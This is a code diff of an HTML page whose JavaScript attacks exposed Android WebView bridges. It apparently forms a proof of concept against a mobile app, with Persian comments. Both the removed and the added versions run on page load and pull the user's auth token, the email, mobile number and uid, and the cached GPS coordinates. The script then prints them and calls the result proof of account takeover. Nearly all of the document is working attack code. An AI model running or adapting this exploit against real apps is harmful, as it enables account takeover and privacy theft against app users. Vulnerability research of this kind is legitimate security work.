@@ -32,46 +32,49 @@
     </div>
 
     <script>
-    function log(message, isCritical = false) {
-        var logBox = document.getElementById('logs');
-        var color = isCritical ? "#ff4757" : "#2ed573";
-        logBox.innerHTML += "> <span style='color:" + color + ";'>" + message + "</span><br>";
+    function log(msg, critical = false) {
+        var box = document.getElementById('logs');
+        var color = critical ? "red" : "#0f0";
+        box.innerHTML += "> <span style='color:"+color+"'>" + msg + "</span><br>";
     }
 
-    function runFinalExploit() {
-        log("Starting Targeted Extraction...");
+    function startFinalHeist() {
+        log("Initiating Critical Data Extraction...");
 
-        // ۱. استخراج توکن کاربر از IBUStorageV2_a (بسیار خطرناک)
-        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-            var token = window.IBUStorageV2_a.IBUGetUserValue("token");
-            if (token) {
-                log("CRITICAL: Stolen User Token: " + token, true);
-                alert("Account Takeover Proven! Token: " + token);
-            } else {
-                log("IBUGetUserValue('token') returned null. Trying 'auth'...");
-                var auth = window.IBUStorageV2_a.IBUGetUserValue("auth");
-                if(auth) log("CRITICAL: Stolen Auth: " + auth, true);
+        // ۱. اکسپلویت لوکیشن (اثبات نقض حریم خصوصی)
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+            var loc = window.Locate_a.getCachedLocationData();
+            if (loc) {
+                log("PRIVACY BREACH: User Coordinates Found!");
+                // استخراج لاتیتود و لانگیتود بر اساس متد toJSONObjectForHybrid
+                log("LAT: " + loc.lat + " | LNG: " + loc.lng, true);
             }
         }
 
-        // ۲. استخراج از Storage_a بر اساس متد get در CTStorage.java
-        // پارامترها: (domain, key, default)
-        if (window.Storage_a && window.Storage_a.get) {
-            var sensitiveKeys = ["email", "userName", "mobile", "uid"];
-            sensitiveKeys.forEach(function(k) {
-                var val = window.Storage_a.get("common", k, "not_found");
-                if (val !== "not_found") log("SENSITIVE DATA: " + k + " = " + val, true);
+        // ۲. اکسپلویت دیتابیس (فرمت صحیح فرمان برای H5URLCommand)
+        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+            // ایجاد آبجکت آرگومان که h5URLCommand آن را پارس می‌کند
+            // طبق کد شما، این کلاس از Command String مقدار bussiness و key را می‌کشد بیرون
+            var payload = JSON.stringify({
+                "action": "IBUGetUserValue",
+                "arguments": {
+                    "bussiness": "common",
+                    "key": "token"
+                }
             });
-        }
 
-        // ۳. نقض حریم خصوصی با Locate_a
-        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-            var loc = window.Locate_a.getCachedLocationData();
-            log("PRIVACY LEAK: Cached Location: " + JSON.stringify(loc), true);
+            log("Executing IBUGetUserValue with Payload...");
+            try {
+                // صدا کردن متد با رشته JSON
+                window.IBUStorageV2_a.IBUGetUserValue(payload);
+                log("Command sent. Check Burp Suite or Callback for response.");
+            } catch(e) {
+                log("Error: " + e.message, true);
+            }
         }
     }
 
-    setTimeout(runFinalExploit, 2000);
+    setTimeout(startFinalHeist, 2000);
 </script>
 </body>
 </html>
